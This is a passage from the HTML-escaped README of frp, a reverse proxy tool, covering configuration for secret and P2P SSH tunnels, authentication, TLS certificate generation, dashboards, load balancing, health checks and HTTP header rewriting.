127.0.0.1&#xA;plugin_header_X-From-Where = frp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Visit &lt;code&gt;https://test.example.com&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Expose your service privately&lt;/h3&gt; &#xA;&lt;p&gt;Some services will be at risk if exposed directly to the public network. With &lt;strong&gt;STCP&lt;/strong&gt; (secret TCP) mode, a preshared key is needed to access the service from another client.&lt;/p&gt; &#xA;&lt;p&gt;Configure &lt;code&gt;frps&lt;/code&gt; same as above.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt; on machine B with the following config. This example is for exposing the SSH service (port 22), and note the &lt;code&gt;sk&lt;/code&gt; field for the preshared key, and that the &lt;code&gt;remote_port&lt;/code&gt; field is removed here:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[secret_ssh]&#xA;type = stcp&#xA;sk = abcdefg&#xA;local_ip = 127.0.0.1&#xA;local_port = 22&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Start another &lt;code&gt;frpc&lt;/code&gt; (typically on another machine C) with the following config to access the SSH service with a security key (&lt;code&gt;sk&lt;/code&gt; field):&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[secret_ssh_visitor]&#xA;type = stcp&#xA;role = visitor&#xA;server_name = secret_ssh&#xA;sk = abcdefg&#xA;bind_addr = 127.0.0.1&#xA;bind_port = 6000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;On machine C, connect to SSH on machine B, using this command:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;ssh -oPort=6000 127.0.0.1&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;P2P Mode&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;xtcp&lt;/strong&gt; is designed for transmitting large amounts of data directly between clients. A frps server is still needed, as P2P here only refers the actual data transmission.&lt;/p&gt; &#xA;&lt;p&gt;Note it can&#39;t penetrate all types of NAT devices. You might want to fallback to &lt;strong&gt;stcp&lt;/strong&gt; if &lt;strong&gt;xtcp&lt;/strong&gt; doesn&#39;t work.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;In &lt;code&gt;frps.ini&lt;/code&gt; configure a UDP port for xtcp:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;bind_udp_port = 7001&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt; on machine B, expose the SSH port. Note that &lt;code&gt;remote_port&lt;/code&gt; field is removed:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[p2p_ssh]&#xA;type = xtcp&#xA;sk = abcdefg&#xA;local_ip = 127.0.0.1&#xA;local_port = 22&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Start another &lt;code&gt;frpc&lt;/code&gt; (typically on another machine C) with the config to connect to SSH using P2P mode:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[p2p_ssh_visitor]&#xA;type = xtcp&#xA;role = visitor&#xA;server_name = p2p_ssh&#xA;sk = abcdefg&#xA;bind_addr = 127.0.0.1&#xA;bind_port = 6000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;On machine C, connect to SSH on machine B, using this command:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;ssh -oPort=6000 127.0.0.1&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;h3&gt;Configuration Files&lt;/h3&gt; &#xA;&lt;p&gt;Read the full example configuration files to find out even more features not described here.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/conf/frps_full.ini&#34;&gt;Full configuration file for frps (Server)&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/conf/frpc_full.ini&#34;&gt;Full configuration file for frpc (Client)&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Using Environment Variables&lt;/h3&gt; &#xA;&lt;p&gt;Environment variables can be referenced in the configuration file, using Go&#39;s standard format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = {{ .Envs.FRP_SERVER_ADDR }}&#xA;server_port = 7000&#xA;&#xA;[ssh]&#xA;type = tcp&#xA;local_ip = 127.0.0.1&#xA;local_port = 22&#xA;remote_port = {{ .Envs.FRP_SSH_REMOTE_PORT }}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With the config above, variables can be passed into &lt;code&gt;frpc&lt;/code&gt; program like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;export FRP_SERVER_ADDR=&#34;x.x.x.x&#34;&#xA;export FRP_SSH_REMOTE_PORT=&#34;6000&#34;&#xA;./frpc -c ./frpc.ini&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;frpc&lt;/code&gt; will render configuration file template using OS environment variables. Remember to prefix your reference with &lt;code&gt;.Envs&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Split Configures Into Different Files&lt;/h3&gt; &#xA;&lt;p&gt;You can split multiple proxy configs into different files and include them in the main file.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;includes=./confd/*.ini&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# ./confd/test.ini&#xA;[ssh]&#xA;type = tcp&#xA;local_ip = 127.0.0.1&#xA;local_port = 22&#xA;remote_port = 6000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Dashboard&lt;/h3&gt; &#xA;&lt;p&gt;Check frp&#39;s status and proxies&#39; statistics information by Dashboard.&lt;/p&gt; &#xA;&lt;p&gt;Configure a port for dashboard to enable this feature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;[common]&#xA;dashboard_port = 7500&#xA;# dashboard&#39;s username and password are both optional&#xA;dashboard_user = admin&#xA;dashboard_pwd = admin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then visit &lt;code&gt;http://[server_addr]:7500&lt;/code&gt; to see the dashboard, with username and password both being &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/doc/pic/dashboard.png&#34; alt=&#34;dashboard&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Admin UI&lt;/h3&gt; &#xA;&lt;p&gt;The Admin UI helps you check and manage frpc&#39;s configuration.&lt;/p&gt; &#xA;&lt;p&gt;Configure an address for admin UI to enable this feature:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;[common]&#xA;admin_addr = 127.0.0.1&#xA;admin_port = 7400&#xA;admin_user = admin&#xA;admin_pwd = admin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then visit &lt;code&gt;http://127.0.0.1:7400&lt;/code&gt; to see admin UI, with username and password both being &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Monitor&lt;/h3&gt; &#xA;&lt;p&gt;When dashboard is enabled, frps will save monitor data in cache. It will be cleared after process restart.&lt;/p&gt; &#xA;&lt;p&gt;Prometheus is also supported.&lt;/p&gt; &#xA;&lt;h4&gt;Prometheus&lt;/h4&gt; &#xA;&lt;p&gt;Enable dashboard first, then configure &lt;code&gt;enable_prometheus = true&lt;/code&gt; in &lt;code&gt;frps.ini&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;http://{dashboard_addr}/metrics&lt;/code&gt; will provide prometheus monitor data.&lt;/p&gt; &#xA;&lt;h3&gt;Authenticating the Client&lt;/h3&gt; &#xA;&lt;p&gt;There are 2 authentication methods to authenticate frpc with frps.&lt;/p&gt; &#xA;&lt;p&gt;You can decide which one to use by configuring &lt;code&gt;authentication_method&lt;/code&gt; under &lt;code&gt;[common]&lt;/code&gt; in &lt;code&gt;frpc.ini&lt;/code&gt; and &lt;code&gt;frps.ini&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Configuring &lt;code&gt;authenticate_heartbeats = true&lt;/code&gt; under &lt;code&gt;[common]&lt;/code&gt; will use the configured authentication method to add and validate authentication on every heartbeat between frpc and frps.&lt;/p&gt; &#xA;&lt;p&gt;Configuring &lt;code&gt;authenticate_new_work_conns = true&lt;/code&gt; under &lt;code&gt;[common]&lt;/code&gt; will do the same for every new work connection between frpc and frps.&lt;/p&gt; &#xA;&lt;h4&gt;Token Authentication&lt;/h4&gt; &#xA;&lt;p&gt;When specifying &lt;code&gt;authentication_method = token&lt;/code&gt; under &lt;code&gt;[common]&lt;/code&gt; in &lt;code&gt;frpc.ini&lt;/code&gt; and &lt;code&gt;frps.ini&lt;/code&gt; - token based authentication will be used.&lt;/p&gt; &#xA;&lt;p&gt;Make sure to specify the same &lt;code&gt;token&lt;/code&gt; in the &lt;code&gt;[common]&lt;/code&gt; section in &lt;code&gt;frps.ini&lt;/code&gt; and &lt;code&gt;frpc.ini&lt;/code&gt; for frpc to pass frps validation&lt;/p&gt; &#xA;&lt;h4&gt;OIDC Authentication&lt;/h4&gt; &#xA;&lt;p&gt;When specifying &lt;code&gt;authentication_method = oidc&lt;/code&gt; under &lt;code&gt;[common]&lt;/code&gt; in &lt;code&gt;frpc.ini&lt;/code&gt; and &lt;code&gt;frps.ini&lt;/code&gt; - OIDC based authentication will be used.&lt;/p&gt; &#xA;&lt;p&gt;OIDC stands for OpenID Connect, and the flow used is called &lt;a href=&#34;https://tools.ietf.org/html/rfc6749#section-4.4&#34;&gt;Client Credentials Grant&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To use this authentication type - configure &lt;code&gt;frpc.ini&lt;/code&gt; and &lt;code&gt;frps.ini&lt;/code&gt; as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;authentication_method = oidc&#xA;oidc_issuer = https://example-oidc-issuer.com/&#xA;oidc_audience = https://oidc-audience.com/.default&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;authentication_method = oidc&#xA;oidc_client_id = 98692467-37de-409a-9fac-bb2585826f18 # Replace with OIDC client ID&#xA;oidc_client_secret = oidc_secret&#xA;oidc_audience = https://oidc-audience.com/.default&#xA;oidc_token_endpoint_url = https://example-oidc-endpoint.com/oauth2/v2.0/token&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Encryption and Compression&lt;/h3&gt; &#xA;&lt;p&gt;The features are off by default. You can turn on encryption and/or compression:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[ssh]&#xA;type = tcp&#xA;local_port = 22&#xA;remote_port = 6000&#xA;use_encryption = true&#xA;use_compression = true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;TLS&lt;/h4&gt; &#xA;&lt;p&gt;frp supports the TLS protocol between &lt;code&gt;frpc&lt;/code&gt; and &lt;code&gt;frps&lt;/code&gt; since v0.25.0.&lt;/p&gt; &#xA;&lt;p&gt;For port multiplexing, frp sends a first byte &lt;code&gt;0x17&lt;/code&gt; to dial a TLS connection.&lt;/p&gt; &#xA;&lt;p&gt;Configure &lt;code&gt;tls_enable = true&lt;/code&gt; in the &lt;code&gt;[common]&lt;/code&gt; section to &lt;code&gt;frpc.ini&lt;/code&gt; to enable this feature.&lt;/p&gt; &#xA;&lt;p&gt;To &lt;strong&gt;enforce&lt;/strong&gt; &lt;code&gt;frps&lt;/code&gt; to only accept TLS connections - configure &lt;code&gt;tls_only = true&lt;/code&gt; in the &lt;code&gt;[common]&lt;/code&gt; section in &lt;code&gt;frps.ini&lt;/code&gt;. &lt;strong&gt;This is optional.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;frpc&lt;/code&gt; TLS settings (under the &lt;code&gt;[common]&lt;/code&gt; section):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;tls_enable = true&#xA;tls_cert_file = certificate.crt&#xA;tls_key_file = certificate.key&#xA;tls_trusted_ca_file = ca.crt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;frps&lt;/code&gt; TLS settings (under the &lt;code&gt;[common]&lt;/code&gt; section):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;tls_only = true&#xA;tls_enable = true&#xA;tls_cert_file = certificate.crt&#xA;tls_key_file = certificate.key&#xA;tls_trusted_ca_file = ca.crt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You will need &lt;strong&gt;a root CA cert&lt;/strong&gt; and &lt;strong&gt;at least one SSL/TLS certificate&lt;/strong&gt;. It &lt;strong&gt;can&lt;/strong&gt; be self-signed or regular (such as Let&#39;s Encrypt or another SSL/TLS certificate provider).&lt;/p&gt; &#xA;&lt;p&gt;If you using &lt;code&gt;frp&lt;/code&gt; via IP address and not hostname, make sure to set the appropriate IP address in the Subject Alternative Name (SAN) area when generating SSL/TLS Certificates.&lt;/p&gt; &#xA;&lt;p&gt;Given an example:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Prepare openssl config file. It exists at &lt;code&gt;/etc/pki/tls/openssl.cnf&lt;/code&gt; in Linux System and &lt;code&gt;/System/Library/OpenSSL/openssl.cnf&lt;/code&gt; in MacOS, and you can copy it to current path, like &lt;code&gt;cp /etc/pki/tls/openssl.cnf ./my-openssl.cnf&lt;/code&gt;. If not, you can build it by yourself, like:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;cat &amp;gt; my-openssl.cnf &amp;lt;&amp;lt; EOF&#xA;[ ca ]&#xA;default_ca = CA_default&#xA;[ CA_default ]&#xA;x509_extensions = usr_cert&#xA;[ req ]&#xA;default_bits        = 2048&#xA;default_md          = sha256&#xA;default_keyfile     = privkey.pem&#xA;distinguished_name  = req_distinguished_name&#xA;attributes          = req_attributes&#xA;x509_extensions     = v3_ca&#xA;string_mask         = utf8only&#xA;[ req_distinguished_name ]&#xA;[ req_attributes ]&#xA;[ usr_cert ]&#xA;basicConstraints       = CA:FALSE&#xA;nsComment              = &#34;OpenSSL Generated Certificate&#34;&#xA;subjectKeyIdentifier   = hash&#xA;authorityKeyIdentifier = keyid,issuer&#xA;[ v3_ca ]&#xA;subjectKeyIdentifier   = hash&#xA;authorityKeyIdentifier = keyid:always,issuer&#xA;basicConstraints       = CA:true&#xA;EOF&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;build ca certificates:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;openssl genrsa -out ca.key 2048&#xA;openssl req -x509 -new -nodes -key ca.key -subj &#34;/CN=example.ca.com&#34; -days 5000 -out ca.crt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;build frps certificates:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;openssl genrsa -out server.key 2048&#xA;&#xA;openssl req -new -sha256 -key server.key \&#xA;    -subj &#34;/C=XX/ST=DEFAULT/L=DEFAULT/O=DEFAULT/CN=server.com&#34; \&#xA;    -reqexts SAN \&#xA;    -config &amp;lt;(cat my-openssl.cnf &amp;lt;(printf &#34;\n[SAN]\nsubjectAltName=DNS:localhost,IP:127.0.0.1,DNS:example.server.com&#34;)) \&#xA;    -out server.csr&#xA;&#xA;openssl x509 -req -days 365 \&#xA;&#x9;-in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \&#xA;&#x9;-extfile &amp;lt;(printf &#34;subjectAltName=DNS:localhost,IP:127.0.0.1,DNS:example.server.com&#34;) \&#xA;&#x9;-out server.crt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;build frpc certificates：&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;openssl genrsa -out client.key 2048&#xA;openssl req -new -sha256 -key client.key \&#xA;    -subj &#34;/C=XX/ST=DEFAULT/L=DEFAULT/O=DEFAULT/CN=client.com&#34; \&#xA;    -reqexts SAN \&#xA;    -config &amp;lt;(cat my-openssl.cnf &amp;lt;(printf &#34;\n[SAN]\nsubjectAltName=DNS:client.com,DNS:example.client.com&#34;)) \&#xA;    -out client.csr&#xA;&#xA;openssl x509 -req -days 365 \&#xA;    -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial \&#xA;&#x9;-extfile &amp;lt;(printf &#34;subjectAltName=DNS:client.com,DNS:example.client.com&#34;) \&#xA;&#x9;-out client.crt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Hot-Reloading frpc configuration&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;admin_addr&lt;/code&gt; and &lt;code&gt;admin_port&lt;/code&gt; fields are required for enabling HTTP API:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;admin_addr = 127.0.0.1&#xA;admin_port = 7400&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then run command &lt;code&gt;frpc reload -c ./frpc.ini&lt;/code&gt; and wait for about 10 seconds to let &lt;code&gt;frpc&lt;/code&gt; create or update or remove proxies.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note that parameters in [common] section won&#39;t be modified except &#39;start&#39;.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can run command &lt;code&gt;frpc verify -c ./frpc.ini&lt;/code&gt; before reloading to check if there are config errors.&lt;/p&gt; &#xA;&lt;h3&gt;Get proxy status from client&lt;/h3&gt; &#xA;&lt;p&gt;Use &lt;code&gt;frpc status -c ./frpc.ini&lt;/code&gt; to get status of all proxies. The &lt;code&gt;admin_addr&lt;/code&gt; and &lt;code&gt;admin_port&lt;/code&gt; fields are required for enabling HTTP API.&lt;/p&gt; &#xA;&lt;h3&gt;Only allowing certain ports on the server&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;allow_ports&lt;/code&gt; in &lt;code&gt;frps.ini&lt;/code&gt; is used to avoid abuse of ports:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;allow_ports = 2000-3000,3001,3003,4000-50000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;allow_ports&lt;/code&gt; consists of specific ports or port ranges (lowest port number, dash &lt;code&gt;-&lt;/code&gt;, highest port number), separated by comma &lt;code&gt;,&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Port Reuse&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;vhost_http_port&lt;/code&gt; and &lt;code&gt;vhost_https_port&lt;/code&gt; in frps can use same port with &lt;code&gt;bind_port&lt;/code&gt;. frps will detect the connection&#39;s protocol and handle it correspondingly.&lt;/p&gt; &#xA;&lt;p&gt;We would like to try to allow multiple proxies bind a same remote port with different protocols in the future.&lt;/p&gt; &#xA;&lt;h3&gt;Bandwidth Limit&lt;/h3&gt; &#xA;&lt;h4&gt;For Each Proxy&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[ssh]&#xA;type = tcp&#xA;local_port = 22&#xA;remote_port = 6000&#xA;bandwidth_limit = 1MB&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Set &lt;code&gt;bandwidth_limit&lt;/code&gt; in each proxy&#39;s configure to enable this feature. Supported units are &lt;code&gt;MB&lt;/code&gt; and &lt;code&gt;KB&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;TCP Stream Multiplexing&lt;/h3&gt; &#xA;&lt;p&gt;frp supports tcp stream multiplexing since v0.10.0 like HTTP2 Multiplexing, in which case all logic connections to the same frpc are multiplexed into the same TCP connection.&lt;/p&gt; &#xA;&lt;p&gt;You can disable this feature by modify &lt;code&gt;frps.ini&lt;/code&gt; and &lt;code&gt;frpc.ini&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini and frpc.ini, must be same&#xA;[common]&#xA;tcp_mux = false&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Support KCP Protocol&lt;/h3&gt; &#xA;&lt;p&gt;KCP is a fast and reliable protocol that can achieve the transmission effect of a reduction of the average latency by 30% to 40% and reduction of the maximum delay by a factor of three, at the cost of 10% to 20% more bandwidth wasted than TCP.&lt;/p&gt; &#xA;&lt;p&gt;KCP mode uses UDP as the underlying transport. Using KCP in frp:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Enable KCP in frps:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;bind_port = 7000&#xA;# Specify a UDP port for KCP.&#xA;kcp_bind_port = 7000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;kcp_bind_port&lt;/code&gt; number can be the same number as &lt;code&gt;bind_port&lt;/code&gt;, since &lt;code&gt;bind_port&lt;/code&gt; field specifies a TCP port.&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Configure &lt;code&gt;frpc.ini&lt;/code&gt; to use KCP to connect to frps:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;# Same as the &#39;kcp_bind_port&#39; in frps.ini&#xA;server_port = 7000&#xA;protocol = kcp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Connection Pooling&lt;/h3&gt; &#xA;&lt;p&gt;By default, frps creates a new frpc connection to the backend service upon a user request. With connection pooling, frps keeps a certain number of pre-established connections, reducing the time needed to establish a connection.&lt;/p&gt; &#xA;&lt;p&gt;This feature is suitable for a large number of short connections.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Configure the limit of pool count each proxy can use in &lt;code&gt;frps.ini&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;max_pool_count = 5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Enable and specify the number of connection pool:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;pool_count = 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load balancing&lt;/h3&gt; &#xA;&lt;p&gt;Load balancing is supported by &lt;code&gt;group&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This feature is only available for types &lt;code&gt;tcp&lt;/code&gt;, &lt;code&gt;http&lt;/code&gt;, &lt;code&gt;tcpmux&lt;/code&gt; now.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[test1]&#xA;type = tcp&#xA;local_port = 8080&#xA;remote_port = 80&#xA;group = web&#xA;group_key = 123&#xA;&#xA;[test2]&#xA;type = tcp&#xA;local_port = 8081&#xA;remote_port = 80&#xA;group = web&#xA;group_key = 123&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;group_key&lt;/code&gt; is used for authentication.&lt;/p&gt; &#xA;&lt;p&gt;Connections to port 80 will be dispatched to proxies in the same group randomly.&lt;/p&gt; &#xA;&lt;p&gt;For type &lt;code&gt;tcp&lt;/code&gt;, &lt;code&gt;remote_port&lt;/code&gt; in the same group should be the same.&lt;/p&gt; &#xA;&lt;p&gt;For type &lt;code&gt;http&lt;/code&gt;, &lt;code&gt;custom_domains&lt;/code&gt;, &lt;code&gt;subdomain&lt;/code&gt;, &lt;code&gt;locations&lt;/code&gt; should be the same.&lt;/p&gt; &#xA;&lt;h3&gt;Service Health Check&lt;/h3&gt; &#xA;&lt;p&gt;Health check feature can help you achieve high availability with load balancing.&lt;/p&gt; &#xA;&lt;p&gt;Add &lt;code&gt;health_check_type = tcp&lt;/code&gt; or &lt;code&gt;health_check_type = http&lt;/code&gt; to enable health check.&lt;/p&gt; &#xA;&lt;p&gt;With health check type &lt;strong&gt;tcp&lt;/strong&gt;, the service port will be pinged (TCPing):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[test1]&#xA;type = tcp&#xA;local_port = 22&#xA;remote_port = 6000&#xA;# Enable TCP health check&#xA;health_check_type = tcp&#xA;# TCPing timeout seconds&#xA;health_check_timeout_s = 3&#xA;# If health check failed 3 times in a row, the proxy will be removed from frps&#xA;health_check_max_failed = 3&#xA;# A health check every 10 seconds&#xA;health_check_interval_s = 10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With health check type &lt;strong&gt;http&lt;/strong&gt;, an HTTP request will be sent to the service and an HTTP 2xx OK response is expected:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web]&#xA;type = http&#xA;local_ip = 127.0.0.1&#xA;local_port = 80&#xA;custom_domains = test.example.com&#xA;# Enable HTTP health check&#xA;health_check_type = http&#xA;# frpc will send a GET request to &#39;/status&#39;&#xA;# and expect an HTTP 2xx OK response&#xA;health_check_url = /status&#xA;health_check_timeout_s = 3&#xA;health_check_max_failed = 3&#xA;health_check_interval_s = 10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Rewriting the HTTP Host Header&lt;/h3&gt; &#xA;&lt;p&gt;By default frp does not modify the tunneled HTTP requests at all as it&#39;s a byte-for-byte copy.&lt;/p&gt; &#xA;&lt;p&gt;However, speaking of web servers and HTTP requests, your web server might rely on the &lt;code&gt;Host&lt;/code&gt; HTTP header to determine the website to be accessed. frp can rewrite the &lt;code&gt;Host&lt;/code&gt; header when forwarding the HTTP requests, with the &lt;code&gt;host_header_rewrite&lt;/code&gt; field:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web]&#xA;type = http&#xA;local_port = 80&#xA;custom_domains = test.example.com&#xA;host_header_rewrite = dev.example.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The HTTP request will have the the &lt;code&gt;Host&lt;/code&gt; header rewritten to &lt;code&gt;Host: dev.example.com&lt;/code&gt; when it reaches the actual web server, although the request from the browser probably has &lt;code&gt;Host: test.example.com&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Setting other HTTP Headers&lt;/h3&gt; &#xA;&lt;p&gt;Similar to &lt;code&gt;Host&lt;/code&gt;, You can override other HTTP request headers with proxy type &lt;code&gt;http&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web]&#xA;type = http&#xA;local_port = 80&#xA;custom_domains = test.example.com&#xA;host_header_rewrite = dev.example.com&#xA;header_X-From-Where = frp&#xA;&lt;/code&gt;&lt;/pre&gt; 